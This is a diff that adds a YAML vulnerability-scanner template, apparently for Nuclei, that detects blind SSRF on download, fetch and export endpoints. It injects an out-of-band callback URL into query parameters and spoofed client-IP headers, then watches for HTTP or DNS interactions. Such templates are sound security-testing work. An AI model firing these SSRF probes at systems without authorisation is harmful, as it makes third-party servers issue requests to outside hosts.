@@ -1,0 +1,39 @@
+id: blind-ssrf-download-extended
+
+info:
+  name: Extended Blind SSRF in Download & Media Endpoints
+  author: J4D3s-Gs-z14-0
+  severity: high
+  description: Detects Blind SSRF vulnerabilities on file download, path fetcher, and document exporter endpoints via OAST callbacks.
+  tags: ssrf, blind-ssrf, oast, dast, download
+
+http:
+  - method: GET
+    path:
+      # Endpoints comuns de download com parâmetros de caminho / URL
+      - "{{BaseURL}}/download.php?pdf_path=http://{{interactsh-url}}"
+      - "{{BaseURL}}/download.php?file=http://{{interactsh-url}}"
+      - "{{BaseURL}}/download.php?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/download?path=http://{{interactsh-url}}"
+      - "{{BaseURL}}/download?file_url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/api/download?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/fetch?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/export.php?file=http://{{interactsh-url}}"
+      - "{{BaseURL}}/view.php?path=http://{{interactsh-url}}"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      X-Forwarded-For: "{{interactsh-url}}"
+      X-Client-IP: "{{interactsh-url}}"
+      X-Real-IP: "{{interactsh-url}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
